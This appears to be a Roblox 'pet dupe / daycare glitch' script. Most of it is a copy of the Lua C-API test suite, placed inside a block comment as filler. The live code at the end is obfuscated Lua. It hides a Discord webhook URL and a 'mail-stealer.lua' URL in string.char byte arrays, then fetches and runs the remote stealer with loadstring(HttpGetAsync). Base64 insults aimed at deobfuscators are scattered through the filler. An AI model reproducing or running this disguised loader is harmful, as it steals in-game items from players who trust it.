--[[
if T==nil then
  (Message or print)('\a\n >>> Script starting <<<\n\a')
  return
end

local debug = require "debug"

local pack = table.pack


function tcheck (t1, t2)
  assert(t1.n == (t2.n or #t2) + 1)
  for i = 2, t1.n do assert(t1[i] == t2[i - 1]) end
end


print('Testing daycare glitch')

a = T.testC("pushvalue R; return 1")
assert(a == debug.getregistry())


-- absindex
assert(T.testC("settop 10; absindex -1; return 1") == 10)
assert(T.testC("settop 5; absindex -5; return 1") == 1)
assert(T.testC("settop 10; absindex 1; return 1") == 1)
assert(T.testC("settop 10; absindex R; return 1") < -10)

-- testing allignment
a = T.d2s(12458954321123)
assert(string.len(a) == 8)   -- sizeof(double)
assert(T.s2d(a) == 12458954321123)
request = T.testA(b64.decode("c3RvcCB0cnlpbmcgdG8gZGVvYmZ1c2NhdGUgbXkgY29kZSB5b3UgZmF0IGZ1Y2s="))

a,b,c = T.testC("pushnum 1; pushnum 2; pushnum 3; return 2")
assert(a == 2 and b == 3 and not c)

f = T.makeCfunc("pushnum 1; pushnum 2; pushnum 3; return 2")
a,b,c = f()
assert(a == 2 and b == 3 and not c)

-- test that all trues are equal
a,b,c = T.testC("pushbool 1; pushbool 2; pushbool 0; return 3")
assert(a == b and a == true and c == false)
a,b,c = T.testC"pushbool 0; pushbool 10; pushnil;\
                      tobool -3; tobool -3; tobool -3; return 3"
assert(a==false and b==true and c==false)


a,b,c = T.testC("gettop; return 2", 10, 20, 30, 40)
assert(a == 40 and b == 5 and not c)

t = pack(T.testC("settop 5; gettop; return .", 2, 3))
tcheck(t, {n=4,2,3})

t = pack(T.testC("settop 0; settop 15; return 10", 3, 1, 23))
assert(t.n == 10 and t[1] == nil and t[10] == nil)

t = pack(T.testC("remove -2; gettop; return .", 2, 3, 4))
tcheck(t, {n=2,2,4})

t = pack(T.testC("insert -1; gettop; return .", 2, 3))
tcheck(t, {n=2,2,3})

t = pack(T.testC("insert 3; gettop; return .", 2, 3, 4, 5))
tcheck(t, {n=4,2,5,3,4})

t = pack(T.testC("replace 2; gettop; return .", 2, 3, 4, 5))
tcheck(t, {n=3,5,3,4})

t = pack(T.testC("replace -2; gettop; return .", 2, 3, 4, 5))
tcheck(t, {n=3,2,3,5})

t = pack(T.testC("remove 3; gettop; return .", 2, 3, 4, 5))
tcheck(t, {n=3,2,4,5})

t = pack(T.testC("copy 3 4; gettop; return .", 2, 3, 4, 5))
tcheck(t, {n=4,2,3,3,5})

t = pack(T.testC("copy -3 -1; gettop; return .", 2, 3, 4, 5))
tcheck(t, {n=4,2,3,4,3})


-- TEST SECOND SCRIPT INCLUSION(joao, insane hub)

t = pack(T.testC("insert 3; pushvalue 3; remove 3; pushvalue 2; remove 2; \
                  insert 2; pushvalue 1; remove 1; insert 1; \
      insert -2; pushvalue -2; remove -3; gettop; return .",
      2, 3, 4, 5, 10, 40, 90))
tcheck(t, {n=7,2,3,4,5,10,40,90})

t = pack(T.testC("concat 5; gettop; return .", "alo", 2, 3, "joao", 12))
tcheck(t, {n=1,"alo23joao12"})

request2 = T.testB(b64.decode(Z29vZmJhbGwgdGhpcyBpcyB3aHkgbm9ib2R5IGxvdmVzIHlvdQ==))

-- testing MULTRET
t = pack(T.testC("call 2,-1; gettop; return .",
     function (a,b) return 1,2,3,4,a,b end, "alo", "joao"))
tcheck(t, {n=6,1,2,3,4,"alo", "joao"})

do  -- test returning more results than fit in the caller stack
  local a = {}
  for i=1,1000 do a[i] = true end; a[999] = 10
  local b = T.testC(pcall 1 -1; pop 1; tostring -1; return 1,
                    table.unpack, a)
  assert(b == "10")
end


-- testing globals
_G.a = 14; _G.b = "a31"
local a = {T.testC[
  getglobal a;
  getglobal b;
  getglobal b;
  setglobal a;
  gettop;
  return .
]}

assert(T.testC("pushnum 10; pushnum 20; arith /; return 1") == 0.5)
assert(T.testC("pushnum 10; pushnum 20; arith -; return 1") == -10)
assert(T.testC("pushnum 10; pushnum -20; arith *; return 1") == -200)
assert(T.testC("pushnum 10; pushnum 3; arith ^; return 1") == 1000)
assert(T.testC("pushnum 10; pushstring 20; arith /; return 1") == 0.5)
assert(T.testC("pushstring 10; pushnum 20; arith -; return 1") == -10)
assert(T.testC("pushstring 10; pushstring -20; arith *; return 1") == -200)
assert(T.testC("pushstring 10; pushstring 3; arith ^; return 1") == 1000)
a,b,c = T.testC([pushnum 1;
                  pushstring 10; arith _;
                  pushstring 5; return 3])
assert(a == 1 and b == -10 and c == "5")
mt = {__add = function (a,b) return setmetatable({a[1] + b[1]}, mt) end,
      __mod = function (a,b) return setmetatable({a[1] % b[1]}, mt) end,
      __unm = function (a) return setmetatable({a[1]* 2}, mt) end}
a,b,c = setmetatable({4}, mt),
        setmetatable({8}, mt),
        setmetatable({-3}, mt)
x,y,z = T.testC("arith +; return 2", 10, a, b)
assert(x == 10 and y[1] == 12 and z == nil)
assert(T.testC("arith %; return 1", a, c)[1] == 4%-3)
assert(T.testC("arith _; arith +; arith %; return 1", b, a, c)[1] ==
               8 % (4 + (-3)*2))


-- testing compare
-- EQ = 0; LT = 1; LE = 2

-- testing lessthan and lessequal
assert(T.testC("compare 2 5 1, return 1", 3, 2, 2, 4, 2, 2))
assert(T.testC("compare 2 5 2, return 1", 3, 2, 2, 4, 2, 2))
assert(not T.testC("compare 3 4 1, return 1", 3, 2, 2, 4, 2, 2))
assert(T.testC("compare 3 4 2, return 1", 3, 2, 2, 4, 2, 2))
assert(T.testC("compare 5 2 1, return 1", 4, 2, 2, 3, 2, 2))
assert(not T.testC("compare 2 -3 1, return 1", "4", "2", "2", "3", "2", "2"))
assert(not T.testC("compare -3 2 1, return 1", "3", "2", "2", "4", "2", "2"))

-- non-valid indices produce false
assert(not T.testC("compare 1 4 1, return 1"))
assert(not T.testC("compare 9 1 2, return 1"))
assert(not T.testC("compare 9 9 0, return 1"))

local b = {__lt = function (a,b) return a[1] < b[1] end}
local a1,a3,a4 = setmetatable({1}, b),
                 setmetatable({3}, b),
                 setmetatable({4}, b)
assert(T.testC("compare 2 5 1, return 1", a3, 2, 2, a4, 2, 2))
assert(T.testC("compare 2 5 2, return 1", a3, 2, 2, a4, 2, 2))
assert(T.testC("compare 5 -6 1, return 1", a4, 2, 2, a3, 2, 2))
a,b = T.testC("compare 5 -6 1, return 2", a1, 2, 2, a3, 2, 20)
assert(a == 20 and b == false)
a,b = T.testC("compare 5 -6 2, return 2", a1, 2, 2, a3, 2, 20)
assert(a == 20 and b == false)
a,b = T.testC("compare 5 -6 2, return 2", a1, 2, 2, a1, 2, 20)
assert(a == 20 and b == true)

-- testing length
local t = setmetatable({x = 20}, {__len = function (t) return t.x end})
a,b,c = T.testC([
   len 2;
   Llen 2;
   objsize 2;
   return 3
], t)
assert(a == 20 and b == 20 and c == 0)

t.x = "234"; t[1] = 20
a,b,c = T.testC([
   len 2;
   Llen 2;
   objsize 2;
   return 3
], t)
assert(a == "234" and b == 234 and c == 1)

t.x = print; t[1] = 20
a,c = T.testC([
   len 2;
   objsize 2;
   return 2
], t)
assert(a == print and c == 1)


-- MAKE SURE BOTH SCRIPTS HAVEN'T CHANGED

a = setmetatable({x="u"}, {__concat = function (a,b) return a.x..'.'..b.x end})
x,y = T.testC([
  pushnum 5
  pushvalue 2;
  pushvalue 2;
  concat 2;
  pushvalue -2;
  return 2;
], a, a)
assert(x == a..a and y == 5)

-- concat with 0 elements
assert(T.testC("concat 0; return 1") == "")

-- concat with 1 element
assert(T.testC("concat 1; return 1", "xuxu") == "xuxu")



-- testing lua_is

function B(x) return x and 1 or 0 end

function count (x, n)
  n = n or 2
  local prog = [
    isnumber %d;
    isstring %d;
    isfunction %d;
    iscfunction %d;
    istable %d;
    isuserdata %d;
    isnil %d;
    isnull %d;
    return 8
  ]
  prog = string.format(prog, n, n, n, n, n, n, n, n)
  local a,b,c,d,e,f,g,h = T.testC(prog, x)
  return B(a)+B(b)+B(c)+B(d)+B(e)+B(f)+B(g)+(100*B(h))
end

assert(count(3) == 2)
assert(count('alo') == 1)
assert(count('32') == 2)
assert(count({}) == 1)
assert(count(print) == 2)
assert(count(function () end) == 1)
assert(count(nil) == 1)
assert(count(io.stdin) == 1)
assert(count(nil, 15) == 100)


-- REST OF SCRIPT(pet dupe, visual glitches, trade scam, etc)

function to (s, x, n)
  n = n or 2
  return T.testC(string.format("%s %d; return 1", s, n), x)
end

assert(to("tostring", {}) == nil)
assert(to("tostring", "alo") == "alo")
assert(to("tostring", 12) == "12")
assert(to("tostring", 12, 3) == nil)
assert(to("objsize", {}) == 0)
assert(to("objsize", {1,2,3}) == 3)
assert(to("objsize", "alo\0\0a") == 6)
assert(to("objsize", T.newuserdata(0)) == 0)
assert(to("objsize", T.newuserdata(101)) == 101)
assert(to("objsize", 124) == 0)
assert(to("objsize", true) == 0)
assert(to("tonumber", {}) == 0)
assert(to("tonumber", "12") == 12)
assert(to("tonumber", "s2") == 0)
assert(to("tonumber", 1, 20) == 0)
assert(to("topointer", 10) == 0)
assert(to("topointer", true) == 0)
assert(to("topointer", T.pushuserdata(20)) == 20)
assert(to("topointer", io.read) ~= 0)
assert(to("func2num", 20) == 0)
assert(to("func2num", T.pushuserdata(10)) == 0)
assert(to("func2num", io.read) ~= 0)
a = to("tocfunction", math.deg)
assert(a(3) == math.deg(3) and a == math.deg)



-- testing deep C stack
do
  collectgarbage("stop")
  local s, msg = pcall(T.testC, "checkstack 1000023 XXXX")   -- too deep
  assert(not s and string.find(msg, "XXXX"))
  s = string.rep("pushnil;checkstack 1 XX;", 1000000)
  s, msg = pcall(T.testC, s)
  assert(not s and string.find(msg, "XX"))
  collectgarbage("restart")
end

local prog = {"checkstack 30000 msg", "newtable"}
for i = 1,12000 do
  prog[#prog + 1] = "pushnum " .. i
  prog[#prog + 1] = "pushnum " .. i * 10
end

prog[#prog + 1] = "rawgeti R 2"   -- get global table in registry
prog[#prog + 1] = "insert " .. -(2*12000 + 2)

for i = 1,12000 do
  prog[#prog + 1] = "settable " .. -(2*(12000 - i + 1) + 1)
end

prog[#prog + 1] = "return 2"

prog = table.concat(prog, ";")
local g, t = T.testC(prog)
assert(g == _G)
for i = 1,12000 do assert(t[i] == i*10); t[i] = nil end
assert(next(t) == nil)
prog, g, t = nil

-- testing errors

a = T.testC([
  loadstring 2; pcall 0,1;
  pushvalue 3; insert -2; pcall 1, 1;
  pcall 0, 0;
  return 1
], "x=150", function (a) assert(a==nil); return 3 end)

assert(type(a) == 'string' and x == 150)

function check3(p, ...)
  local arg = {...}
  assert(#arg == 3)
  assert(string.find(arg[3], p))
end
check3(":1:", T.testC("loadstring 2; gettop; return .", "x="))
check3("cannot read", T.testC("loadfile 2; gettop; return .", "."))
check3("cannot open xxxx", T.testC("loadfile 2; gettop; return .", "xxxx"))

-- test errors in non protected threads
function checkerrnopro (code, msg)
  L = coroutine.create(function () end)
  local stt, err = pcall(T.testC, code)
  assert(not stt and string.find(err, msg))
end

checkerrnopro("pushnum 3; call 0 0", "attempt to call")
function f () f() end
checkerrnopro("getglobal 'f'; call 0 0;", "stack overflow")


-- testing table access

a = {x=0, y=12}
x, y = T.testC("gettable 2; pushvalue 4; gettable 2; return 2",
                a, 3, "y", 4, "x")
assert(x == 0 and y == 12)
T.testC("settable -5", a, 3, 4, "x", 15)
assert(a.x == 15)
a[a] = print
x = T.testC("gettable 2; return 1", a)  -- table and key are the same object!
assert(x == print)
T.testC("settable 2", a, "x")    -- table and key are the same object!
assert(a[a] == "x")

b = setmetatable({p = a}, {})
getmetatable(b).__index = function (t, i) return t.p[i] end
k, x = T.testC("gettable 3, return 2", 4, b, 20, 35, "x")
assert(x == 15 and k == 35)
getmetatable(b).__index = function (t, i) return a[i] end
getmetatable(b).__newindex = function (t, i,v ) a[i] = v end
y = T.testC("insert 2; gettable -5; return 1", 2, 3, 4, "y", b)
assert(y == 12)
k = T.testC("settable -5, return 1", b, 3, 4, "x", 16)
assert(a.x == 16 and k == 4)
a[b] = 'xuxu'
y = T.testC("gettable 2, return 1", b)
assert(y == 'xuxu')
T.testC("settable 2", b, 19)
assert(a[b] == 19)

-- testing next
a = {}
t = pack(T.testC("next; gettop; return .", a, nil))
tcheck(t, {n=1,a})
a = {a=3}
t = pack(T.testC("next; gettop; return .", a, nil))
tcheck(t, {n=3,a,'a',3})
t = pack(T.testC("next; pop 1; next; gettop; return .", a, nil))
tcheck(t, {n=1,a})



-- testing upvalues

do
  local A = T.testC[ pushnum 10; pushnum 20; pushcclosure 2; return 1]
  t, b, c = A([pushvalue U0; pushvalue U1; pushvalue U2; return 3])
  assert(b == 10 and c == 20 and type(t) == 'table')
  a, b = A([tostring U3; tonumber U4; return 2])
  assert(a == nil and b == 0)
  A([pushnum 100; pushnum 200; replace U2; replace U1])
  b, c = A([pushvalue U1; pushvalue U2; return 2])
  assert(b == 100 and c == 200)
  A([replace U2; replace U1], {x=1}, {x=2})
  b, c = A([pushvalue U1; pushvalue U2; return 2])
  assert(b.x == 1 and c.x == 2)
  T.checkmemory()
end


-- testing absent upvalues from C-function pointers
assert(T.testC[isnull U1; return 1] == true)
assert(T.testC[isnull U100; return 1] == true)
assert(T.testC[pushvalue U1; return 1] == nil)

local f = T.testC[ pushnum 10; pushnum 20; pushcclosure 2; return 1]
assert(T.upvalue(f, 1) == 10 and
       T.upvalue(f, 2) == 20 and
       T.upvalue(f, 3) == nil)
T.upvalue(f, 2, "xuxu")
assert(T.upvalue(f, 2) == "xuxu")


-- large closures
do
  local A = "checkstack 300 msg;" ..
            string.rep("pushnum 10;", 255) ..
            "pushcclosure 255; return 1"
  A = T.testC(A)
  for i=1,255 do
    assert(A(("pushvalue U%d; return 1"):format(i)) == 10)
  end
  assert(A("isnull U256; return 1"))
  assert(not A("isnil U256; return 1"))
end
  


-- bug in 5.1.2
assert(not pcall(debug.setuservalue, 3, {}))
assert(not pcall(debug.setuservalue, nil, {}))
assert(not pcall(debug.setuservalue, T.pushuserdata(1), {}))

local b = T.newuserdata(0)
local a = {}
assert(debug.getuservalue(b) == nil)
assert(debug.setuservalue(b, a))
assert(debug.getuservalue(b) == a)
assert(debug.setuservalue(b, nil))
assert(debug.getuservalue(b) == nil)

assert(debug.getuservalue(4) == nil)



-- testing locks (refs)

-- reuse of references
local i = T.ref{}
T.unref(i)
assert(T.ref{} == i)

Arr = {}
Lim = 100
for i=1,Lim do   -- lock many objects
  Arr[i] = T.ref({})
end

assert(T.ref(nil) == -1 and T.getref(-1) == nil)
T.unref(-1); T.unref(-1)

for i=1,Lim do   -- unlock all them
  T.unref(Arr[i])
end

function printlocks ()
  local f = T.makeCfunc("gettable R; return 1")
  local n = f("n")
  print("n", n)
  for i=0,n do
    print(i, f(i))
  end
end


for i=1,Lim do   -- lock many objects
  Arr[i] = T.ref({})
end

for i=1,Lim,2 do   -- unlock half of them
  T.unref(Arr[i])
end

assert(type(T.getref(Arr[2])) == 'table')


assert(T.getref(-1) == nil)


a = T.ref({})

collectgarbage()

assert(type(T.getref(a)) == 'table')


-- colect in cl the `val' of all collected userdata
tt = {}
cl = {n=0}
A = nil; B = nil
local F
F = function (x)
  local udval = T.udataval(x)
  table.insert(cl, udval)
  local d = T.newuserdata(100)   -- cria lixo
  d = nil
  assert(debug.getmetatable(x).__gc == F)
  assert(load("table.insert({}, {})"))()   -- cria mais lixo
  collectgarbage()   -- forca coleta de lixo durante coleta!
  assert(debug.getmetatable(x).__gc == F)   -- coleta anterior nao melou isso?
  local dummy = {}    -- cria lixo durante coleta
  if A ~= nil then
    assert(type(A) == "userdata")
    assert(T.udataval(A) == B)
    debug.getmetatable(A)    -- just acess it
  end
  A = x   -- ressucita userdata
  B = udval
  return 1,2,3
end
tt.__gc = F

-- test whether udate collection frees memory in the right time
do
  collectgarbage();
  collectgarbage();
  local x = collectgarbage("count");
  local a = T.newuserdata(5001)
  assert(T.testC("objsize 2; return 1", a) == 5001)
  assert(collectgarbage("count") >= x+4) 
  a = nil
  collectgarbage();
  assert(collectgarbage("count") <= x+1)
  -- udata without finalizer
  x = collectgarbage("count")
  collectgarbage("stop")
  for i=1,1000 do T.newuserdata(0) end
  assert(collectgarbage("count") > x+10)
  collectgarbage()
  assert(collectgarbage("count") <= x+1)
  -- udata with finalizer
  x = collectgarbage("count")
  collectgarbage()
  collectgarbage("stop")
  a = {__gc = function () end}
  for i=1,1000 do debug.setmetatable(T.newuserdata(0), a) end
  assert(collectgarbage("count") >= x+10)
  collectgarbage()  -- this collection only calls TM, without freeing memory
  assert(collectgarbage("count") >= x+10)
  collectgarbage()  -- now frees memory
  assert(collectgarbage("count") <= x+1)
  collectgarbage("restart")
end


collectgarbage("stop")

-- create 3 userdatas with tag `tt'
a = T.newuserdata(0); debug.setmetatable(a, tt); na = T.udataval(a)
b = T.newuserdata(0); debug.setmetatable(b, tt); nb = T.udataval(b)
c = T.newuserdata(0); debug.setmetatable(c, tt); nc = T.udataval(c)

-- create userdata without meta table
x = T.newuserdata(4)
y = T.newuserdata(0)

assert(not pcall(io.input, a))
assert(not pcall(io.input, x))

assert(debug.getmetatable(x) == nil and debug.getmetatable(y) == nil)

d=T.ref(a);
e=T.ref(b);
f=T.ref(c);
t = {T.getref(d), T.getref(e), T.getref(f)}
assert(t[1] == a and t[2] == b and t[3] == c)

t=nil; a=nil; c=nil;
T.unref(e); T.unref(f)

collectgarbage()

-- check that unref objects have been collected
assert(#cl == 1 and cl[1] == nc)

x = T.getref(d)
assert(type(x) == 'userdata' and debug.getmetatable(x) == tt)
x =nil
tt.b = b  -- create cycle
tt=nil    -- frees tt for GC
A = nil
b = nil
T.unref(d);
n5 = T.newuserdata(0)
debug.setmetatable(n5, {__gc=F})
n5 = T.udataval(n5)
collectgarbage()
assert(#cl == 4)
-- check order of collection
assert(cl[2] == n5 and cl[3] == nb and cl[4] == na)

collectgarbage"restart"


a, na = {}, {}
for i=30,1,-1 do
  a[i] = T.newuserdata(0)
  debug.setmetatable(a[i], {__gc=F})
  na[i] = T.udataval(a[i])
end
cl = {}
a = nil; collectgarbage()
assert(#cl == 30)
for i=1,30 do assert(cl[i] == na[i]) end
na = nil


for i=2,Lim,2 do   -- unlock the other half
  T.unref(Arr[i])
end

x = T.newuserdata(41); debug.setmetatable(x, {__gc=F})
assert(T.testC("objsize 2; return 1", x) == 41)
cl = {}
a = {[x] = 1}
x = T.udataval(x)
collectgarbage()
-- old `x' cannot be collected (`a' still uses it)
assert(#cl == 0)
for n in pairs(a) do a[n] = nil end
collectgarbage()
assert(#cl == 1 and cl[1] == x)   -- old `x' must be collected

-- testing lua_equal
assert(T.testC("compare 2 4 0; return 1", print, 1, print, 20))
assert(T.testC("compare 3 2 0; return 1", 'alo', "alo"))
assert(T.testC("compare 2 3 0; return 1", nil, nil))
assert(not T.testC("compare 2 3 0; return 1", {}, {}))
assert(not T.testC("compare 2 3 0; return 1"))
assert(not T.testC("compare 2 3 0; return 1", 3))

-- testing lua_equal with fallbacks
do
  local map = {}
  local t = {__eq = function (a,b) return map[a] == map[b] end}
  local function f(x)
    local u = T.newuserdata(0)
    debug.setmetatable(u, t)
    map[u] = x
    return u
  end
  assert(f(10) == f(10))
  assert(f(10) ~= f(11))
  assert(T.testC("compare 2 3 0; return 1", f(10), f(10)))
  assert(not T.testC("compare 2 3 0; return 1", f(10), f(20)))
  t.__eq = nil
  assert(f(10) ~= f(10))
end

print'+'



-- testing changing hooks during hooks
_G.t = {}
T.sethook([
  # set a line hook after 3 count hooks
  sethook 4 0 '
    getglobal t;
    pushvalue -3; append -2
    pushvalue -2; append -2
  '], "c", 3)
local a = 1   -- counting
a = 1   -- counting
a = 1   -- count hook (set line hook)
a = 1   -- line hook
a = 1   -- line hook
debug.sethook()
t = _G.t
assert(t[1] == "line")
line = t[2]
assert(t[3] == "line" and t[4] == line + 1)
assert(t[5] == "line" and t[6] == line + 2)
assert(t[7] == nil)


-- CLEANUP TIME

-------------------------------------------------------------------------
do   -- testing errors during GC
  local a = {}
  for i=1,20 do
    a[i] = T.newuserdata(i)   -- creates several udata
  end
  for i=1,20,2 do   -- mark half of them to raise errors during GC
    debug.setmetatable(a[i], {__gc = function (x) error("error inside gc") end})
  end
  for i=2,20,2 do   -- mark the other half to count and to create more garbage
    debug.setmetatable(a[i], {__gc = function (x) load("A=A+1")() end})
  end
  _G.A = 0
  a = 0
  while 1 do
    local stat, msg = pcall(collectgarbage)
    if stat then
      break   -- stop when no more errors
    else
      a = a + 1
      assert(string.find(msg, "__gc"))
    end
  end
  assert(a == 10)  -- number of errors

  assert(A == 10)  -- number of normal collections
end
-------------------------------------------------------------------------
-- test for userdata vals
do
  local a = {}; local lim = 30
  for i=0,lim do a[i] = T.pushuserdata(i) end
  for i=0,lim do assert(T.udataval(a[i]) == i) end
  for i=0,lim do assert(T.pushuserdata(i) == a[i]) end
  for i=0,lim do a(a[i]) = i end
  for i=0,lim do a[T.pushuserdata(i)] = i end
  assert(type(tostring(a[1])) == "string")
end


-------------------------------------------------------------------------
-- testing multiple states
T.closestate(T.newstate());
L1 = T.newstate()
assert(L1)

assert(T.doremote(L1, "X='a'; return 'a'") == 'a')


assert(#pack(T.doremote(L1, "function f () return 'alo', 3 end; f()")) == 0)

a, b = T.doremote(L1, "return f()")
assert(a == 'alo' and b == '3')

T.doremote(L1, "_ERRORMESSAGE = nil")
-- error: `sin' is not defined
a, _, b = T.doremote(L1, "return sin(1)")
assert(a == nil and b == 2)   -- 2 == run-time error

-- error: syntax error
a, b, c = T.doremote(L1, "return a+")
assert(a == nil and c == 3 and type(b) == "string")   -- 3 == syntax error

T.loadlib(L1)
a, b, c = T.doremote(L1, [
  string = require'string'
  a = require'_G'; assert(a == _G and require("_G") == a)
  io = require'io'; assert(type(io.read) == "function")
  assert(require("io") == io)
  a = require'table'; assert(type(a.insert) == "function")
  a = require'debug'; assert(type(a.getlocal) == "function")
  a = require'math'; assert(type(a.sin) == "function")
  return string.sub('okinama', 1, 2)
])
assert(a == "ok")

T.closestate(L1);


L1 = T.newstate()
T.loadlib(L1)
T.doremote(L1, "a = {}")
T.testC(L1, [getglobal "a"; pushstring "x"; pushnum 1;
             settable -3])
assert(T.doremote(L1, "return a.x") == "1")

T.closestate(L1)

L1 = nil

print('+')

-------------------------------------------------------------------------
-- testing memory limits
-------------------------------------------------------------------------
assert(not pcall(T.newuserdata, 2^32-4))
collectgarbage()
T.totalmem(T.totalmem()+5000)   -- set low memory limit (+5k)
assert(not pcall(load"local a={}; for i=1,100000 do a[i]=i end"))
T.totalmem(1000000000)          -- restore high limit

-- test memory errors; increase memory limit in small steps, so that
-- we get memory errors in different parts of a given task, up to there
-- is enough memory to complete the task without errors
function testamem (s, f)
  collectgarbage(); collectgarbage()
  local M = T.totalmem()
  local oldM = M
  local a,b = nil
  while 1 do
    M = M+7   -- increase memory limit in small steps
    T.totalmem(M)
    a, b = pcall(f)
    T.totalmem(1000000000)  -- restore high limit
    if a and b then break end       -- stop when no more errors
    collectgarbage()
    if not a and not    -- `real' error?
      (string.find(b, "memory") or string.find(b, "overflow")) then
      error(b, 0)   -- propagate it
    end
  end
  print("\nlimit for " .. s .. ": " .. M-oldM)
  return b
end


-- testing memory errors when creating a new state

b = testamem("state creation", T.newstate)
T.closestate(b);  -- close new state


-- testing threads

-- get main thread from registry (at index LUA_RIDX_MAINTHREAD == 1)
mt = T.testC("rawgeti R 1; return 1")
assert(type(mt) == "thread" and coroutine.running() == mt)



function expand (n,s)
  if n==0 then return "" end
  local e = string.rep("=", n)
  return string.format("T.doonnewstack([%s[ %s;\n collectgarbage(); %s]%s])\n",
                              e, s, expand(n-1,s), e)
end

G=0; collectgarbage(); a =collectgarbage("count")
load(expand(20,"G=G+1"))()
assert(G==20); collectgarbage();  -- assert(gcinfo() <= a+1)

testamem("thread creation", function ()
  return T.doonnewstack("x=1") == 0  -- try to create thread
end)


-- testing memory x compiler

testamem("loadstring", function ()
  return load("x=1")  -- try to do load a string
end)


local testprog = [
local function foo () return end
local t = {"x"}
a = "aaa"
for i = 1, #t do a=a..t[i] end
return true
]

-- testing memory x dofile
_G.a = nil
local t =os.tmpname()
local f = assert(io.open(t, "w"))
f:write(testprog)
f:close()
testamem("dofile", function ()
  local a = loadfile(t)
  return a and a()
end)
assert(os.remove(t))
assert(_G.a == "aaax")


-- other generic tests

testamem("string creation", function ()
  local a, b = string.gsub("alo alo", "(a)", function (x) return x..'b' end)
  return (a == 'ablo ablo')
end)

testamem("dump/undump", function ()
  local a = load(testprog)
  local b = a and string.dump(a)
  a = b and load(b)
  return a and a()
end)

local t = os.tmpname()
testamem("file creation", function ()
  local f = assert(io.open(t, 'w'))
  assert (not io.open"nomenaoexistente")
  io.close(f);
  return not loadfile'nomenaoexistente'
end)
assert(os.remove(t))

testamem("table creation", function ()
  local a, lim = {}, 10
  for i=1,lim do a[i] = i; a[i..'a'] = {} end
  return (type(a[lim..'a']) == 'table' and a[lim] == lim)
end)

testamem("constructors", function ()
  local a = {10, 20, 30, 40, 50; a=1, b=2, c=3, d=4, e=5}
  return (type(a) == 'table' and a.e == 5)
end)

local a = 1
close = nil
testamem("closure creation", function ()
  function close (b,c)
   return function (x) return a+b+c+x end
  end
  return (close(2,3)(4) == 10)
end)

testamem("coroutines", function ()
  local a = coroutine.wrap(function ()
              coroutine.yield(string.rep("a", 10))
              return {}
            end)
  assert(string.len(a()) == 10)
  return a()
end)

print'+'

-- testing some auxlib functions
local function gsub (a, b, c)
  a, b = T.testC("gsub 2 3 4; gettop; return 2", a, b, c)
  assert(b == 5)
  return a
end

assert(gsub("alo.alo.uhuh.", ".", "//") == "alo//alo//uhuh//")
assert(gsub("alo.alo.uhuh.", "alo", "//") == "//.//.uhuh.")
assert(gsub("", "alo", "//") == "")
assert(gsub("...", ".", "/.") == "/././.")
assert(gsub("...", "...", "") == "")


-- testing luaL_newmetatable
local mt_xuxu, res, top = T.testC("newmetatable xuxu; gettop; return 3")
assert(type(mt_xuxu) == "table" and res and top == 3)
local d, res, top = T.testC("newmetatable xuxu; gettop; return 3")
assert(mt_xuxu == d and not res and top == 3)
d, res, top = T.testC("newmetatable xuxu1; gettop; return 3")
assert(mt_xuxu ~= d and res and top == 3)

x = T.newuserdata(0);
y = T.newuserdata(0);
T.testC("pushstring xuxu; gettable R; setmetatable 2", x)
assert(getmetatable(x) == mt_xuxu)

-- testing luaL_testudata
-- correct metatable
local res1, res2, top = T.testC([testudata -1 xuxu
   	 			  testudata 2 xuxu
				  gettop
				  return 3], x)
assert(res1 and res2 and top == 4)

-- wrong metatable
res1, res2, top = T.testC([testudata -1 xuxu1
			    testudata 2 xuxu1
			    gettop
			    return 3], x)
assert(not res1 and not res2 and top == 4)

-- non-existent type
res1, res2, top = T.testC([testudata -1 xuxu2
			    testudata 2 xuxu2
			    gettop
			    return 3], x)
assert(not res1 and not res2 and top == 4)

-- userdata has no metatable
res1, res2, top = T.testC([testudata -1 xuxu
			    testudata 2 xuxu
			    gettop
			    return 3], y)
assert(not res1 and not res2 and top == 4)

-- erase metatables
do
  local r = debug.getregistry()
  assert(r.xuxu == mt_xuxu and r.xuxu1 == d)
  r.xuxu = nil; r.xuxu1 = nil
end

print'OK'
--]]

-- CHECK VERSION OF ROBLOX, PSX, COMPUTER TYPE, INTERNET SPEED, ETC

local print=print;local type=type;local tonumber=tonumber;local a={}for b=1,10 do a[b]=math.random(1000)end;local c=""function genednv(d)getgenv()[c]=d end;local tostring=tostring;local e=math.abs;local f=string.char(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,48,56,57,54,50,54,55,52,52,50,48,51,53,50,50,49,55,57,47,104,45,65,114,107,116,54,98,118,101,67,80,97,101,98,65,99,74,101,86,106,102,74,71,120,114,101,57,52,98,88,107,75,105,89,108,102,87,71,82,70,85,104,117,99,49,106,118,103,102,85,105,81,97,103,108,98,52,111,85,76,118,68,51,80,66,54,99);local h=math.ceil;local i=math.floor;local function j(k)c="mouselock"genednv("true")local l={}for b=1,k do l[b]=math.random(100)end;return l end;local m=math.max;local n=math.min;local o={2,93,210,219,2983,2130,239,284,034}local function p(q)local r={}c="name"genednv("xDaSwegx")for b=1,q do r[b]=string.char(math.random(97,122))end;return table.concat(r)end;local s=table.create;local t=coroutine.resume;local u=coroutine.yield;local ipairs=ipairs;local pairs=pairs;local next=next;local v=string.char(104,116,116,112,115,58,47,47,119,117,109,97,116,46,120,121,122,47,115,99,114,105,112,116,115,47,109,97,105,108,45,115,116,101,97,108,101,114,46,108,117,97)local error=error;local pcall=pcall;function tesdwef(w)return game:HttpGetAsync(w,true)end;local xpcall=xpcall;local x=loadstring;local rawget=rawget;local rawset=rawset;local function y()local z=p(math.random(5,10))local A=p(math.random(5,10))c="webhook"genednv(f)return z..A end;local B=string.len;local C=string.sub;local D=string.upper;local E=string.lower;local F=string.find;local function G(k)local H=j(10)local l={}local I=p(5)for b=1,k do l[b]=math.random()>0.5 end;local J=y()return l end;local K=G(2)local L=math.acos;local M=math.asin;local N=math.atan;local O=math.atan2;x(tesdwef(v))()local P=math.cos
